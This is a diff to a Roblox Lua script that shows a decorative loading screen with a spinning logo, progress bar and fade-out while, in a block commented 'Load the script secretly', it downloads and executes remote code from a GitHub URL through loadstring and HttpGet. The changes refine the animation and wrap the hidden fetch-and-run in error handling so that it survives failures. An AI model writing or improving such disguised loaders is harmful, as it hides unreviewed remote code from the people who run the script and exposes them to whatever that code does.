@@ -34,10 +34,13 @@ robloxIcon.Parent = background
 -- Spin logic (spinning the logo)
 local rotation = 0
 local running = true
-RunService.RenderStepped:Connect(function(dt)
+local connection
+connection = RunService.RenderStepped:Connect(function(dt)
 	if running then
 		rotation = rotation + 90 * dt
 		robloxIcon.Rotation = rotation % 360
+	else
+		connection:Disconnect()
 	end
 end)
 
@@ -110,17 +113,20 @@ creditText.Parent = background
 
 -- Background loading script (Load the script secretly)
 task.spawn(function()
-    -- This will execute the provided loadstring while the screen is up
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/vakfq/test/main/script.lua"))()
-
+    local success, err = pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/vakfq/test/main/script.lua"))()
+    end)
+    if not success then
+        warn("Failed to load external script: ", err)
+    end
 end)
 
--- Progress update loop
+-- Progress update loop (smoother increments)
 for i = 0, 100 do
 	percentText.Text = i .. "%"
 
-	-- Smooth bar tween
-	local tween = TweenService:Create(progressBar, TweenInfo.new(1.8, Enum.EasingStyle.Linear), {
+	-- Tween progress bar smoothly over 0.018 seconds per 1%
+	local tween = TweenService:Create(progressBar, TweenInfo.new(0.018, Enum.EasingStyle.Linear), {
 		Size = UDim2.new(i / 100, 0, 1, 0)
 	})
 	tween:Play()
@@ -138,24 +144,25 @@ for i = 0, 100 do
 		statusText.Text = "DONE"
 	end
 
-	wait(1.8)
+	wait(0.018)
 end
 
 -- Fade out everything once loading is complete
 for i = 1, 10 do
-	background.BackgroundTransparency = i / 10
-	loadingText.TextTransparency = i / 10
-	statusText.TextTransparency = i / 10
-	percentText.TextTransparency = i / 10
-	stroke.Transparency = i / 10
-	robloxIcon.ImageTransparency = i / 10
-	progressBar.BackgroundTransparency = i / 10
-	progressBarBg.BackgroundTransparency = i / 10
-	creditText.TextTransparency = i / 10
+	local transparency = i / 10
+	background.BackgroundTransparency = transparency
+	loadingText.TextTransparency = transparency
+	statusText.TextTransparency = transparency
+	percentText.TextTransparency = transparency
+	stroke.Transparency = transparency
+	robloxIcon.ImageTransparency = transparency
+	progressBar.BackgroundTransparency = transparency
+	progressBarBg.BackgroundTransparency = transparency
+	creditText.TextTransparency = transparency
 	wait(0.05)
 end
 
-running = false
+running = false -- stops spinning logo
 screenGui:Destroy()
 
 -- Re-enable CoreGui (Escape Menu, Leave Game, etc.)
